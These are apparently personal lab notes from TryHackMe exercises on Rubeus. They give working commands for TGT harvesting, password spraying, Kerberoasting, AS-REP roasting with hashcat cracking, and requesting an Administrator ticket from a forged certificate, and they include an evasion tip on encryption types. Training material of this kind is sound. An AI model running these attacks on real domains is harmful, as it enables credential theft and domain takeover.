<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Rubeus</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Rubeus</h1><br/><p><strong>Harvesting And Bruteforcing Tickets With Rubeus</strong></p><p></p><p>Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.</p><p></p><p>Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.</p><p></p><p>The tool has way too many attacks and features for me to cover all of them so I&#39;ll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - <em><strong>https://github.com/GhostPack/Rubeus</strong></em></p><p></p><p>Rubeus is already compiled and on the target machine.</p><p></p><p><em><strong>Rubeus.exe harvest /interval:30</strong></em></p><p>This command tells Rubeus to harvest for TGTs every 30 seconds</p><p></p><p></p><p><img src="images/160-1.png" alt="images/160-1.png" /></p><p></p><p></p><p><strong>Brute-Forcing / Password-Spraying with Rubeus</strong></p><p></p><p>Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and &quot;spray&quot; against all found user accounts in the domain to find which one may have that password.</p><p></p><p>This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.</p><p></p><p><strong>Note:</strong> Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: </p><p></p><p><em><strong>echo 10.10.172.59 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</strong></em></p><p></p><p>1.) cd Downloads - navigate to the directory Rubeus is in</p><p>2.) <em><strong>Rubeus.exe brute /password:Password1 /noticket</strong></em> - This will take a given password and &quot;spray&quot; it against all found users then give the .kirbi TGT for that user </p><p></p><p><img src="images/160-2.png" alt="images/160-2.png" /></p><p></p><p></p><p><strong>Important Note:</strong> Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.</p><p></p><p></p><p><strong>Kerberoasting with Rubeus:</strong></p><p></p><p>1.) cd Downloads - navigate to the directory Rubeus is in</p><p>2.) <strong>Rubeus.exe kerberoast</strong>  - This will dump the Kerberos hash of any kerberoastable users</p><p>	 copy the hash onto your attacker machine and put it into a hash.txt file so we can crack it with hashcat</p><p>3.) <strong>hashcat -m 13100 -a 0 hash.txt Pass.txt</strong> - now crack that hash</p><p></p><p>Or to have a hashcat format output:</p><p><strong>Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt</strong></p><p></p><p></p><p><img src="images/160-3.png" alt="images/160-3.png" /></p><p></p><p><strong>Note:</strong> <em><strong>Use hashcat -h | grep -i “kerberos”</strong></em> : To get details about -m value</p><p>Or use the examples link --→  <strong>https://hashcat.net/wiki/doku.php?id=example_hashes</strong> And search for initial signature (say: <strong>$krb5tgs</strong>)</p><p>Once the hash is cracked we get the password.</p><p></p><p></p><p><strong>AS-REP Roasting Overview</strong> </p><p></p><p>During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.</p><p></p><p></p><p><strong>Dumping KRBASREP5 Hashes with Rubeus</strong></p><p></p><p>1.) cd Downloads - navigate to the directory Rubeus is in</p><p>2.) <strong>Rubeus.exe asreproast</strong> - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.</p><p></p><p>Or to have a hashcat format output:</p><p><strong>Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt</strong></p><p></p><p><img src="images/160-4.png" alt="images/160-4.png" /></p><p></p><p></p><p><strong>Crack those Hashes w/ hashcat</strong>  </p><p></p><p>1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file</p><p>2.) Insert <strong>23$</strong> after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....</p><p>Use the same wordlist that you downloaded in task 4</p><p>3.) <strong>hashcat -m 18200 hash.txt Pass.txt </strong>- crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 </p><p></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Getting TGT from a Forged Certificate/Valid Certificate Received from DC</span></strong></p><p></p><p>Following is the process of getting the Certificates</p><p><em>Forged Certificate : Persisting AD → Certificates</em></p><p><em>Valid Certificate: Exploiting AD → Certificates</em></p><p></p><p>We now have our forged certificate. We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:</p><p></p><p><strong>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101</strong></p><p></p><p>Let&#39;s break down the parameters:</p><p></p><p>    <strong>• /user </strong>- This specifies the user that we will impersonate and has to match the UPN for the certificate we generated</p><p>    <strong>• /enctype</strong> -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert</p><p>    <strong>• /certificate</strong> - Path to the certificate we have generated</p><p>    <strong>• /password</strong> - The password for our certificate file</p><p>    <strong>• /outfile</strong> - The file where our TGT will be output to</p><p>    <strong>• /domain </strong>- The FQDN of the domain we are currently attacking</p><p>    <strong>• /dc </strong>- The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running</p><p>    </p><p><img src="images/160-5.png" alt="images/160-5.png" /></p></div>
</body>
</html>
